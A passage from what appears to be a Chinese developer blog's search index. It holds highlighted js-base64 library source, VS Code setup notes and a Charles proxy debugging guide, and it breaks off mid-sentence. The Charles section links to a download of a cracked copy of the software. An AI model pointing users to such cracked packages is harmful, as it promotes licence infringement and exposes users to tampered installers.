class=\"string\">'undefined'</span></span><br><span class=\"line\">        ? <span class=\"built_in\">module</span>.exports = factory(global)</span><br><span class=\"line\">        : <span class=\"keyword\">typeof</span> define === <span class=\"string\">'function'</span> &amp;&amp; define.amd</span><br><span class=\"line\">        ? define(factory) : <span class=\"literal\">null</span></span><br><span class=\"line\">&#125;((</span><br><span class=\"line\">    <span class=\"keyword\">typeof</span> self !== <span class=\"string\">'undefined'</span> ? self</span><br><span class=\"line\">        : <span class=\"keyword\">typeof</span> <span class=\"built_in\">window</span> !== <span class=\"string\">'undefined'</span> ? <span class=\"built_in\">window</span></span><br><span class=\"line\">        : <span class=\"keyword\">typeof</span> global !== <span class=\"string\">'undefined'</span> ? global</span><br><span class=\"line\">: <span class=\"keyword\">this</span></span><br><span class=\"line\">), <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">global</span>) </span>&#123;</span><br><span class=\"line\"><span class=\"meta\">    'use strict'</span>;</span><br><span class=\"line\">    <span class=\"comment\">// existing version for noConflict()</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> _Base64 = global.Base64;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> version = <span class=\"string\">\"2.4.2\"</span>;</span><br><span class=\"line\">    <span class=\"comment\">// if node.js, we use Buffer</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> buffer;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> <span class=\"built_in\">module</span> !== <span class=\"string\">'undefined'</span> &amp;&amp; <span class=\"built_in\">module</span>.exports) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            buffer = <span class=\"built_in\">require</span>(<span class=\"string\">'buffer'</span>).Buffer;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (err) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// constants</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> b64chars</span><br><span class=\"line\">        = <span class=\"string\">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> b64tab = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">bin</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> t = &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>, l = bin.length; i &lt; l; i++) t[bin.charAt(i)] = i;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">    &#125;(b64chars);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> fromCharCode = <span class=\"built_in\">String</span>.fromCharCode;</span><br><span class=\"line\">    <span class=\"comment\">// encoder stuff</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> cb_utob = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (c.length &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> cc = c.charCodeAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> cc &lt; <span class=\"number\">0x80</span> ? c</span><br><span class=\"line\">                : cc &lt; <span class=\"number\">0x800</span> ? (fromCharCode(<span class=\"number\">0xc0</span> | (cc &gt;&gt;&gt; <span class=\"number\">6</span>))</span><br><span class=\"line\">                                + fromCharCode(<span class=\"number\">0x80</span> | (cc &amp; <span class=\"number\">0x3f</span>)))</span><br><span class=\"line\">                : (fromCharCode(<span class=\"number\">0xe0</span> | ((cc &gt;&gt;&gt; <span class=\"number\">12</span>) &amp; <span class=\"number\">0x0f</span>))</span><br><span class=\"line\">                   + fromCharCode(<span class=\"number\">0x80</span> | ((cc &gt;&gt;&gt;  <span class=\"number\">6</span>) &amp; <span class=\"number\">0x3f</span>))</span><br><span class=\"line\">                   + fromCharCode(<span class=\"number\">0x80</span> | ( cc         &amp; <span class=\"number\">0x3f</span>)));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> cc = <span class=\"number\">0x10000</span></span><br><span class=\"line\">                + (c.charCodeAt(<span class=\"number\">0</span>) - <span class=\"number\">0xD800</span>) * <span class=\"number\">0x400</span></span><br><span class=\"line\">                + (c.charCodeAt(<span class=\"number\">1</span>) - <span class=\"number\">0xDC00</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (fromCharCode(<span class=\"number\">0xf0</span> | ((cc &gt;&gt;&gt; <span class=\"number\">18</span>) &amp; <span class=\"number\">0x07</span>))</span><br><span class=\"line\">                    + fromCharCode(<span class=\"number\">0x80</span> | ((cc &gt;&gt;&gt; <span class=\"number\">12</span>) &amp; <span class=\"number\">0x3f</span>))</span><br><span class=\"line\">                    + fromCharCode(<span class=\"number\">0x80</span> | ((cc &gt;&gt;&gt;  <span class=\"number\">6</span>) &amp; <span class=\"number\">0x3f</span>))</span><br><span class=\"line\">                    + fromCharCode(<span class=\"number\">0x80</span> | ( cc         &amp; <span class=\"number\">0x3f</span>)));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> re_utob = <span class=\"regexp\">/[\\uD800-\\uDBFF][\\uDC00-\\uDFFFF]|[^\\x00-\\x7F]/g</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> utob = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">u</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> u.replace(re_utob, cb_utob);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> cb_encode = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">ccc</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> padlen = [<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>][ccc.length % <span class=\"number\">3</span>],</span><br><span class=\"line\">        ord = ccc.charCodeAt(<span class=\"number\">0</span>) &lt;&lt; <span class=\"number\">16</span></span><br><span class=\"line\">            | ((ccc.length &gt; <span class=\"number\">1</span> ? ccc.charCodeAt(<span class=\"number\">1</span>) : <span class=\"number\">0</span>) &lt;&lt; <span class=\"number\">8</span>)</span><br><span class=\"line\">            | ((ccc.length &gt; <span class=\"number\">2</span> ? ccc.charCodeAt(<span class=\"number\">2</span>) : <span class=\"number\">0</span>)),</span><br><span class=\"line\">        chars = [</span><br><span class=\"line\">            b64chars.charAt( ord &gt;&gt;&gt; <span class=\"number\">18</span>),</span><br><span class=\"line\">            b64chars.charAt((ord &gt;&gt;&gt; <span class=\"number\">12</span>) &amp; <span class=\"number\">63</span>),</span><br><span class=\"line\">            padlen &gt;= <span class=\"number\">2</span> ? <span class=\"string\">'='</span> : b64chars.charAt((ord &gt;&gt;&gt; <span class=\"number\">6</span>) &amp; <span class=\"number\">63</span>),</span><br><span class=\"line\">            padlen &gt;= <span class=\"number\">1</span> ? <span class=\"string\">'='</span> : b64chars.charAt(ord &amp; <span class=\"number\">63</span>)</span><br><span class=\"line\">        ];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> chars.join(<span class=\"string\">''</span>);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> btoa = global.btoa ? <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> global.btoa(b);</span><br><span class=\"line\">    &#125; : <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> b.replace(<span class=\"regexp\">/[\\s\\S]&#123;1,3&#125;/g</span>, cb_encode);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> _encode = buffer ?</span><br><span class=\"line\">        buffer.from &amp;&amp; buffer.from !== <span class=\"built_in\">Uint8Array</span>.from ? <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">u</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (u.constructor === buffer.constructor ? u : buffer.from(u))</span><br><span class=\"line\">                .toString(<span class=\"string\">'base64'</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        :  <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">u</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (u.constructor === buffer.constructor ? u : <span class=\"keyword\">new</span>  buffer(u))</span><br><span class=\"line\">                .toString(<span class=\"string\">'base64'</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        : <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">u</span>) </span>&#123; <span class=\"keyword\">return</span> btoa(utob(u)) &#125;</span><br><span class=\"line\">    ;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> encode = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">u, urisafe</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> !urisafe</span><br><span class=\"line\">            ? _encode(<span class=\"built_in\">String</span>(u))</span><br><span class=\"line\">            : _encode(<span class=\"built_in\">String</span>(u)).replace(<span class=\"regexp\">/[+\\/]/g</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">m0</span>) </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> m0 == <span class=\"string\">'+'</span> ? <span class=\"string\">'-'</span> : <span class=\"string\">'_'</span>;</span><br><span class=\"line\">            &#125;).replace(<span class=\"regexp\">/=/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"built_in\">encodeURI</span> = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">u</span>) </span>&#123; <span class=\"keyword\">return</span> encode(u, <span class=\"literal\">true</span>) &#125;;</span><br><span class=\"line\">    <span class=\"comment\">// decoder stuff</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> re_btou = <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>([</span><br><span class=\"line\">        <span class=\"string\">'[\\xC0-\\xDF][\\x80-\\xBF]'</span>,</span><br><span class=\"line\">        <span class=\"string\">'[\\xE0-\\xEF][\\x80-\\xBF]&#123;2&#125;'</span>,</span><br><span class=\"line\">        <span class=\"string\">'[\\xF0-\\xF7][\\x80-\\xBF]&#123;3&#125;'</span></span><br><span class=\"line\">    ].join(<span class=\"string\">'|'</span>), <span class=\"string\">'g'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> cb_btou = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">cccc</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">switch</span>(cccc.length) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">            <span class=\"keyword\">var</span> cp = ((<span class=\"number\">0x07</span> &amp; cccc.charCodeAt(<span class=\"number\">0</span>)) &lt;&lt; <span class=\"number\">18</span>)</span><br><span class=\"line\">                |    ((<span class=\"number\">0x3f</span> &amp; cccc.charCodeAt(<span class=\"number\">1</span>)) &lt;&lt; <span class=\"number\">12</span>)</span><br><span class=\"line\">                |    ((<span class=\"number\">0x3f</span> &amp; cccc.charCodeAt(<span class=\"number\">2</span>)) &lt;&lt;  <span class=\"number\">6</span>)</span><br><span class=\"line\">                |     (<span class=\"number\">0x3f</span> &amp; cccc.charCodeAt(<span class=\"number\">3</span>)),</span><br><span class=\"line\">            offset = cp - <span class=\"number\">0x10000</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (fromCharCode((offset  &gt;&gt;&gt; <span class=\"number\">10</span>) + <span class=\"number\">0xD800</span>)</span><br><span class=\"line\">                    + fromCharCode((offset &amp; <span class=\"number\">0x3FF</span>) + <span class=\"number\">0xDC00</span>));</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> fromCharCode(</span><br><span class=\"line\">                ((<span class=\"number\">0x0f</span> &amp; cccc.charCodeAt(<span class=\"number\">0</span>)) &lt;&lt; <span class=\"number\">12</span>)</span><br><span class=\"line\">                    | ((<span class=\"number\">0x3f</span> &amp; cccc.charCodeAt(<span class=\"number\">1</span>)) &lt;&lt; <span class=\"number\">6</span>)</span><br><span class=\"line\">                    |  (<span class=\"number\">0x3f</span> &amp; cccc.charCodeAt(<span class=\"number\">2</span>))</span><br><span class=\"line\">            );</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span>  fromCharCode(</span><br><span class=\"line\">                ((<span class=\"number\">0x1f</span> &amp; cccc.charCodeAt(<span class=\"number\">0</span>)) &lt;&lt; <span class=\"number\">6</span>)</span><br><span class=\"line\">                    |  (<span class=\"number\">0x3f</span> &amp; cccc.charCodeAt(<span class=\"number\">1</span>))</span><br><span class=\"line\">            );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> btou = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> b.replace(re_btou, cb_btou);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> cb_decode = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">cccc</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> len = cccc.length,</span><br><span class=\"line\">        padlen = len % <span class=\"number\">4</span>,</span><br><span class=\"line\">        n = (len &gt; <span class=\"number\">0</span> ? b64tab[cccc.charAt(<span class=\"number\">0</span>)] &lt;&lt; <span class=\"number\">18</span> : <span class=\"number\">0</span>)</span><br><span class=\"line\">            | (len &gt; <span class=\"number\">1</span> ? b64tab[cccc.charAt(<span class=\"number\">1</span>)] &lt;&lt; <span class=\"number\">12</span> : <span class=\"number\">0</span>)</span><br><span class=\"line\">            | (len &gt; <span class=\"number\">2</span> ? b64tab[cccc.charAt(<span class=\"number\">2</span>)] &lt;&lt;  <span class=\"number\">6</span> : <span class=\"number\">0</span>)</span><br><span class=\"line\">            | (len &gt; <span class=\"number\">3</span> ? b64tab[cccc.charAt(<span class=\"number\">3</span>)]       : <span class=\"number\">0</span>),</span><br><span class=\"line\">        chars = [</span><br><span class=\"line\">            fromCharCode( n &gt;&gt;&gt; <span class=\"number\">16</span>),</span><br><span class=\"line\">            fromCharCode((n &gt;&gt;&gt;  <span class=\"number\">8</span>) &amp; <span class=\"number\">0xff</span>),</span><br><span class=\"line\">            fromCharCode( n         &amp; <span class=\"number\">0xff</span>)</span><br><span class=\"line\">        ];</span><br><span class=\"line\">        chars.length -= [<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>][padlen];</span><br><span class=\"line\">        <span class=\"keyword\">return</span> chars.join(<span class=\"string\">''</span>);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> atob = global.atob ? <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> global.atob(a);</span><br><span class=\"line\">    &#125; : <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> a.replace(<span class=\"regexp\">/[\\s\\S]&#123;1,4&#125;/g</span>, cb_decode);</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> _decode = buffer ?</span><br><span class=\"line\">        buffer.from &amp;&amp; buffer.from !== <span class=\"built_in\">Uint8Array</span>.from ? <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (a.constructor === buffer.constructor</span><br><span class=\"line\">                    ? a : buffer.from(a, <span class=\"string\">'base64'</span>)).toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        : <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (a.constructor === buffer.constructor</span><br><span class=\"line\">                    ? a : <span class=\"keyword\">new</span> buffer(a, <span class=\"string\">'base64'</span>)).toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        : <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a</span>) </span>&#123; <span class=\"keyword\">return</span> btou(atob(a)) &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> decode = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">a</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> _decode(</span><br><span class=\"line\">            <span class=\"built_in\">String</span>(a).replace(<span class=\"regexp\">/[-_]/g</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">m0</span>) </span>&#123; <span class=\"keyword\">return</span> m0 == <span class=\"string\">'-'</span> ? <span class=\"string\">'+'</span> : <span class=\"string\">'/'</span> &#125;)</span><br><span class=\"line\">                .replace(<span class=\"regexp\">/[^A-Za-z0-9\\+\\/]/g</span>, <span class=\"string\">''</span>)</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> noConflict = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> Base64 = global.Base64;</span><br><span class=\"line\">        global.Base64 = _Base64;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Base64;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"comment\">// export Base64</span></span><br><span class=\"line\">    global.Base64 = &#123;</span><br><span class=\"line\">        VERSION: version,</span><br><span class=\"line\">        atob: atob,</span><br><span class=\"line\">        btoa: btoa,</span><br><span class=\"line\">        fromBase64: decode,</span><br><span class=\"line\">        toBase64: encode,</span><br><span class=\"line\">        utob: utob,</span><br><span class=\"line\">        encode: encode,</span><br><span class=\"line\">        <span class=\"built_in\">encodeURI</span>: <span class=\"built_in\">encodeURI</span>,</span><br><span class=\"line\">        btou: btou,</span><br><span class=\"line\">        decode: decode,</span><br><span class=\"line\">        noConflict: noConflict</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"comment\">// if ES5 is available, make Base64.extendString() available</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> <span class=\"built_in\">Object</span>.defineProperty === <span class=\"string\">'function'</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> noEnum = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">v</span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> &#123;<span class=\"attr\">value</span>:v,<span class=\"attr\">enumerable</span>:<span class=\"literal\">false</span>,<span class=\"attr\">writable</span>:<span class=\"literal\">true</span>,<span class=\"attr\">configurable</span>:<span class=\"literal\">true</span>&#125;;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        global.Base64.extendString = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">Object</span>.defineProperty(</span><br><span class=\"line\">                <span class=\"built_in\">String</span>.prototype, <span class=\"string\">'fromBase64'</span>, noEnum(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> decode(<span class=\"keyword\">this</span>)</span><br><span class=\"line\">                &#125;));</span><br><span class=\"line\">            <span class=\"built_in\">Object</span>.defineProperty(</span><br><span class=\"line\">                <span class=\"built_in\">String</span>.prototype, <span class=\"string\">'toBase64'</span>, noEnum(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">urisafe</span>) </span>&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> encode(<span class=\"keyword\">this</span>, urisafe)</span><br><span class=\"line\">                &#125;));</span><br><span class=\"line\">            <span class=\"built_in\">Object</span>.defineProperty(</span><br><span class=\"line\">                <span class=\"built_in\">String</span>.prototype, <span class=\"string\">'toBase64URI'</span>, noEnum(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> encode(<span class=\"keyword\">this</span>, <span class=\"literal\">true</span>)</span><br><span class=\"line\">                &#125;));</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"comment\">// export Base64 to the namespace</span></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (global[<span class=\"string\">'Meteor'</span>]) &#123; <span class=\"comment\">// Meteor.js</span></span><br><span class=\"line\">        Base64 = global.Base64;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// module.exports and AMD are mutually exclusive.</span></span><br><span class=\"line\">    <span class=\"comment\">// module.exports has precedence.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> <span class=\"built_in\">module</span> !== <span class=\"string\">'undefined'</span> &amp;&amp; <span class=\"built_in\">module</span>.exports) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">module</span>.exports.Base64 = global.Base64;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> define === <span class=\"string\">'function'</span> &amp;&amp; define.amd) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// AMD. Register as an anonymous module.</span></span><br><span class=\"line\">        define([], <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123; <span class=\"keyword\">return</span> global.Base64 &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// that's it!</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;<span class=\"attr\">Base64</span>: global.Base64&#125;</span><br><span class=\"line\">&#125;));</span><br></pre></td></tr></table></figure>\n","categories":["js"],"tags":["js","aes"]},{"title":"vscode常用配置","url":"http://zhoushaw.github.io/2018/01/14/other/tool/vscode-config/","content":"<div><a id=\"more\"></a></div>\n\n<h2 id=\"引言\"><a href=\"#引言\" class=\"headerlink\" title=\"引言\"></a>引言</h2><p>为加快工作效率特将vscode常用配置插件整理出来</p>\n<h2 id=\"配置md预览\"><a href=\"#配置md预览\" class=\"headerlink\" title=\"配置md预览\"></a>配置md预览</h2><p><a href=\"https://github.com/raycon/vscode-markdown-css\" target=\"_blank\" rel=\"noopener\">vscode配置文件github地址</a></p>\n<p>打开配置文件:文件=&gt;首选项=&gt;设置<br>增加以下内容:</p>\n<blockquote>\n<p>在线地址</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"markdown.styles\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"https://github.com/raycon/vscode-markdown-css/blob/master/markdown-pdf.css\"</span></span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>本地vscodemd.css</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"markdown.styles\"</span>: [</span><br><span class=\"line\">      <span class=\"string\">\"file:///C:/Users/Administrator/Desktop/blog/_posts/other/工具/vscodemd.css\"</span></span><br><span class=\"line\">    ],</span><br></pre></td></tr></table></figure>\n<h2 id=\"eslint配置\"><a href=\"#eslint配置\" class=\"headerlink\" title=\"eslint配置\"></a>eslint配置</h2><p><a href=\"https://segmentfault.com/a/1190000009077086\" target=\"_blank\" rel=\"noopener\">原文</a></p>\n<blockquote>\n<p>配置</p>\n</blockquote>\n<p>文件 &gt; 首选项 &gt; 设置，在右侧用户设置中修改 ESLint 的相关配置并保存:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;eslint.options&quot;: &#123;</span><br><span class=\"line\">    &quot;configFile&quot;: &quot;/Users/shawzhou/Desktop/meili/mgj-pay-meilijie/.eslintrc.js&quot;,</span><br><span class=\"line\">    &quot;plugins&quot;: [&quot;html&quot;]</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">&quot;eslint.validate&quot;: [</span><br><span class=\"line\">    &quot;javascript&quot;,</span><br><span class=\"line\">    &quot;javascriptreact&quot;,</span><br><span class=\"line\">    &quot;html&quot;,</span><br><span class=\"line\">    &quot;vue&quot;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>检测项目选装npm包</p>\n</blockquote>\n<p><code>npm install eslint babel-eslint --save-dev</code></p>\n<h2 id=\"自定义代码片段\"><a href=\"#自定义代码片段\" class=\"headerlink\" title=\"自定义代码片段\"></a>自定义代码片段</h2><blockquote>\n<p>起步</p>\n</blockquote>\n<p><code>Code=&gt;首选项=&gt;用户代码片段</code></p>\n","categories":["other"],"tags":["vscode"]},{"title":"charles应用","url":"http://zhoushaw.github.io/2017/10/14/other/tool/charles/","content":"<div><a id=\"more\"></a></div>\n\n\n<h2 id=\"charles破解包\"><a href=\"#charles破解包\" class=\"headerlink\" title=\"charles破解包\"></a>charles破解包</h2><p><a href=\"https://blog.zzzmode.com/2017/05/16/charles-4.0.2-cracked/\" target=\"_blank\" rel=\"noopener\">破解包下载地址</a></p>\n<h2 id=\"如何访问HTTPS请求内容\"><a href=\"#如何访问HTTPS请求内容\" class=\"headerlink\" title=\"如何访问HTTPS请求内容\"></a>如何访问HTTPS请求内容</h2><p>如果需要抓取https内容需要通过,通过设置SSL端口，为所有的可以访问https接口内容。</p>\n<blockquote>\n<p>step1</p>\n</blockquote>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190316_7klf427a2g3162djc8fiel8h4b56g_650x428.jpg\" alt=\"\"></p>\n<blockquote>\n<p>step2</p>\n</blockquote>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190316_0aa0j8dddll335g2ad35ch8838k54_592x442.jpg\" alt=\"\"></p>\n<h2 id=\"关注部分请求\"><a href=\"#关注部分请求\" class=\"headerlink\" title=\"关注部分请求\"></a>关注部分请求</h2><p>在通过Charles抓包时，会抓取到很多http请求，这个时候所需关注的内容<strong>往往不容易找到</strong>。</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190316_5lkd46ijlllhfj4ehg962d9c79glk_1179x726.png\" alt=\"\"></p>\n<p>右击你需要关注的http请求，选择focus后，将会显示的更加全面，将http请求分成两类，可以让你<strong>更容易关注</strong>你所需的http请求</p>\n<h2 id=\"如何修改请求头，返回报文\"><a href=\"#如何修改请求头，返回报文\" class=\"headerlink\" title=\"如何修改请求头，返回报文\"></a>如何修改请求头，返回报文</h2><blockquote>\n<p>选中需要断点的http，</p>\n</blockquote>\n<p>点击上面的断点按钮，并右击选中BrackPoints。</p>\n<ul>\n<li><p>step1<br><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190316_1egk5039j05akc7acf6377lkfb584_1178x727.png\" alt=\"\"></p>\n</li>\n<li><p>step2<br><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190316_1igl6l4b4kld0ccll1gb2gcb06lkh_1176x723.png\" alt=\"\"></p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 选中需要断点的http，点击上面的断点按钮，并右击选中BrackPoints。之后再进行这个http请求之后，分别在</span><br><span class=\"line\">2. 请求的时候可以点击=&gt; Edit Request可以对发送请求头，进行编辑，修改请求头。</span><br><span class=\"line\">3. Execute跳过当前断点，跳入响应请求断点。可以修改返回的内容</span><br></pre></td></tr></table></figure>\n<p>可以将断点修改请求头，将http的response存储下来，并且使用map映射到http请求上，这样子。每当内容进行响应的时候，将自动返回应用的请求内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 右击对应http请求=&gt;Save response..</span><br><span class=\"line\">2. 右击应用httpResponse的http=&gt;Map Local..</span><br><span class=\"line\">3. 关闭映射菜单栏Tool=&gt;Map 